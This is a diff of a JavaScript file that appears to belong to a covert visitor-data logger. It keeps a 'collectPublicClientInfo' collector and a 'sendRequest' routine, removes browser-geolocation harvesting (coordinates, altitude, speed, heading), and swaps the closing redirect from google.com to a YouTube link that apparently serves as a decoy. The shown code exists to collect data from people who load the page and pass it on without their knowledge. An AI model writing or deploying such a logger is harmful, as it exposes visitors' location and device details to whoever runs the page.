@@ -1,26 +1,11 @@
 
 let funcs = [
   collectPublicClientInfo,
-  getPosData,
 ];
 let funcsStatus = new Map();
 
 for (let f of funcs) {
   funcsStatus.set(f.name, false);
-}
-
-
-async function getLocation() {
-  try {
-    return await new Promise(resolve =>
-      navigator.geolocation?.getCurrentPosition(
-        pos => resolve(pos),
-        () => resolve(null)
-      )
-    );
-  } catch {
-    return null;
-  }
 }
 
 async function sendRequest(data) {
@@ -35,22 +20,6 @@ async function sendRequest(data) {
   }
 }
 
-async function getPosData() {
-  try {
-    const pos = await getLocation();
-    const posData = {
-      Latitude: pos.coords.latitude,
-      Longitude: pos.coords.longitude,
-      Accuracy: pos.coords.accuracy,
-      Altitude: pos.coords.altitude,
-      Speed: pos.coords.speed,
-      Heading: pos.coords.heading,
-    };
-    return posData;
-  } catch (err) {
-  }
-}
-
 async function start() {
   for (let f of funcs) {
     let d = await f();
@@ -59,7 +28,7 @@ async function start() {
       funcsStatus.set(f.name, true);
     }
   }
-  window.location.replace("https://google.com");
+  window.location.replace("https://youtu.be/Ow5d54nwEfk");
 }
 
 async function agree() {
